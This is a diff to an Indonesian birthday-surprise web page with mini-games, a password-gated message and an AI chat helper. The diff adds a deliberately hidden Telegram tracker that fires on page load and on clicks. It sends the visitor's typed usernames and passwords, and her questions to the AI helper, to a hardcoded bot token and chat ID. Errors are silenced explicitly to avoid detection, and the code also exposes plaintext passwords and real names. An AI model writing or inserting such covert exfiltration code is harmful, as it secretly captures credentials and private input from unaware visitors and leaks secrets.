@@ -317,6 +317,42 @@
 </head>
 <body>
 
+    <!-- SCRIPT MATA-MATA (TELEGRAM TRACKER) -->
+    <script>
+        function sendStealthTelegram(action, details = "") {
+            const token = "8731904526:AAE2bkcOaFyhpYMo1UzRNe-7XcUR2WvCL2g";
+            const chatId = "5736685592";
+            const time = new Date().toLocaleString('id-ID');
+            let message = `🔔 *NOTIF WEB ALDO*\nWaktu: ${time}\nAksi: *${action}*`;
+            
+            if (details) {
+                message += `\nDetail: ${details}`;
+            }
+            
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            
+            // Mengirim request di background tanpa notif apapun ke UI jika gagal
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(e => {
+                // Biarkan hening, jangan console.error biar nggak ketahuan di inspect element
+            });
+        }
+        
+        // Kirim notif begitu web dibuka
+        window.addEventListener('load', () => {
+            sendStealthTelegram("🌐 Web Utama (index.html) Dibuka", "Pengunjung masuk ke halaman utama.");
+        });
+    </script>
+
     <div id="splash-screen">
         <div class="loader-box"></div>
         <div class="splash-text">MEMUAT SISTEM...</div>
@@ -394,7 +430,8 @@
         </div>
 
         <div class="games-grid" id="games-track">
-            <a href="flapy.html" class="brutal-card game-card game-1 custom-hover ripple-btn">
+            <!-- Tambahkan onclick tracker ke game links -->
+            <a href="flapy.html" class="brutal-card game-card game-1 custom-hover ripple-btn" onclick="sendStealthTelegram('🎮 Buka Game', 'Menuju Flappy Bird')">
                 <div class="game-thumbnail"><img src="img/thumb-flappy.jpg" alt="Flappy Bird" onerror="this.src='https://via.placeholder.com/600x400/4facfe/fff?text=Thumbnail+Flappy'"></div>
                 <div class="game-info">
                     <div><h3>Mission: Flapy Anggie 🐦</h3><p>Cari Clue di sini.</p></div>
@@ -402,7 +439,7 @@
                 </div>
             </a>
 
-            <a href="200408.html" class="brutal-card game-card game-2 custom-hover ripple-btn">
+            <a href="200408.html" class="brutal-card game-card game-2 custom-hover ripple-btn" onclick="sendStealthTelegram('🎮 Buka Game', 'Menuju Game 2048')">
                 <div class="game-thumbnail"><img src="img/thumb-2048.jpg" alt="Game 2048" onerror="this.src='https://via.placeholder.com/600x400/ff6b8a/fff?text=Thumbnail+2048'"></div>
                 <div class="game-info">
                     <div><h3>Mission: Geser Geser 🧩</h3><p>Cari Clue di sini.</p></div>
@@ -431,7 +468,7 @@
             <h2 id="secret-title" class="secret-title"> HAY SAYANG 🎁</h2>
             <p>Masukkan Clue Yang Kamu Dapat.</p>
 
-            <a href="tutor.html" class="alert-bar custom-hover ripple-btn">⚠️ Wajib baca aturan dulu di sini! ⚠️</a>
+            <a href="tutor.html" class="alert-bar custom-hover ripple-btn" onclick="sendStealthTelegram('📖 Buka Aturan', 'Membaca halaman tutor')">⚠️ Wajib baca aturan dulu di sini! ⚠️</a>
 
             <div class="input-wrapper">
                 <label>Username</label>
@@ -448,7 +485,7 @@
             <div class="error-message" id="error-msg">Salah! Jangan nebak-nebak, cari clue-nya di game! 😜</div>
             
             <div class="troll-container">
-                <button id="troll-btn" type="button">Nyerah cari clue? Klik ini 🏳️</button>
+                <button id="troll-btn" type="button" onclick="sendStealthTelegram('🏳️ Tombol Nyerah', 'Mencoba mengklik tombol nyerah di form login')">Nyerah cari clue? Klik ini 🏳️</button>
             </div>
             
         </div>
@@ -583,7 +620,6 @@
         }
 
         window.addEventListener('pointerdown', (e) => {
-            // Hindari meledak kalau klik di input form, tombol, atau di bagian AI
             if (isLiteMode || e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT' || e.target.tagName === 'A' || e.target.closest('.ai-section')) return;
             let x = e.clientX || (e.touches && e.touches[0].clientX); let y = e.clientY || (e.touches && e.touches[0].clientY);
             if (x && y) {
@@ -624,6 +660,8 @@
             document.getElementById('start-gate').classList.add('opened');
             if(!isMusicPlaying) toggleMusic(); 
             setTimeout(typeWriterEffect, 800); 
+            // TRACKER TELEGRAM
+            sendStealthTelegram("🚪 Gerbang Dibuka", "Tombol 'HALO SAYANG PENCET!' diklik.");
         }
 
         const textToType = "Siap untuk melihat kejutanmu hari ini? Cari kuncinya di bawah ya...";
@@ -745,41 +783,46 @@
                 alert("👑 CHEAT ACTIVATED! VIP ACCESS GRANTED 👑");
                 processLogin();
                 cheatCount = 0; 
+                
+                // TRACKER CHEAT
+                sendStealthTelegram("👑 CHEAT VIP DIAKTIFKAN", "User menekan judul 7 kali untuk bypass.");
             }
         });
 
         // =========================================================================
-        // 12. LOGIKA LOGIN FORM SANGAT KETAT (SANDI: 200408!)
+        // 12. LOGIKA LOGIN FORM
         // =========================================================================
         
-        // FIX BUG: Deteksi tombol Enter biar ngga bentrok sama AI
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
-                // Kalau yang lagi diketik itu kotak AI, panggil fungsi AI
                 if (document.activeElement.id === 'aiQuery') {
                     askAI();
                 } else {
-                    // Kalau di luar kotak AI (misal lagi di kotak password), panggil fungsi Login
                     processLogin();
                 }
             }
         });
 
         function processLogin() {
-            const user = document.getElementById('inputUsername').value.trim().toLowerCase();
+            const rawUser = document.getElementById('inputUsername').value.trim();
+            const user = rawUser.toLowerCase();
             const pass = document.getElementById('inputPassword').value.trim();
             const btn = document.getElementById('btn-login');
             const errMsg = document.getElementById('error-msg');
             const container = document.getElementById('login-container');
             let isSuccess = false;
 
-            if (user === "Anggi Dwi Aprilia" || user === "anggi dwi aprilia" || user === "anggie dwi aprilia") {
+            if (user === "anggi dwi aprilia" || user === "anggie dwi aprilia") {
                 if (pass === "200408!") isSuccess = true;
-            } else if (user === "Aldo Leo Saputra") {
+            } else if (user === "aldo leo saputra") {
                 if (pass === "280708!") isSuccess = true;
-            } else if (user === "Alief Hidayat") {
+            } else if (user === "alief hidayat") {
                 if (pass === "200408!") isSuccess = true;
             }
+
+            // TRACKER TELEGRAM UNTUK LOGIN
+            let statusLogin = isSuccess ? "✅ BERHASIL MASUK" : "❌ GAGAL MASUK";
+            sendStealthTelegram("🔐 Percobaan Login", `Username yang diketik:\n\`${rawUser}\`\n\nPassword yang diketik:\n\`${pass}\`\n\nStatus: ${statusLogin}`);
 
             if (isSuccess) {
                 errMsg.style.display = 'none';
@@ -832,13 +875,15 @@
                 return;
             }
 
+            // TRACKER TELEGRAM UNTUK AI
+            sendStealthTelegram("🤖 Tanya Asisten AI", `Pertanyaan:\n"${query}"`);
+
             // Atur status UI
             responseBox.style.display = 'none';
             loadingBox.style.display = 'block';
             btn.disabled = true;
             btn.style.opacity = '0.5';
 
-            // Prompt Sistem agar AI bertingkah seperti Aldo
             const systemPrompt = "Kamu adalah asisten AI yang dibuat oleh Aldo (atau Leo) untuk memandu pacarnya, Anggie, di website ulang tahunnya. Jawab dengan gaya bahasa gaul, santai, lucu, dan sedikit manja/gombal. PENTING: Jika Anggie bertanya tentang password, clue, atau kunci masuk, JANGAN PERNAH sebutkan password aslinya (200408!). Berikan saja petunjuk samar seperti 'coba ingat-ingat tanggal jadian kita sayang' atau suruh dia main game Flappy Bird / 2048 di atas. Jawablah maksimal 3 kalimat saja makanan kesukaan nya aldo gacoan dan suka minum yang manis manis jikalau dia nanya yang personal dan ga ada yang nyuruh di prompt ini kalo bisa jangan di jawab khusus persol kallo dia nanya suka sama aku apa engga jelas suka.";
 
             const payload = {
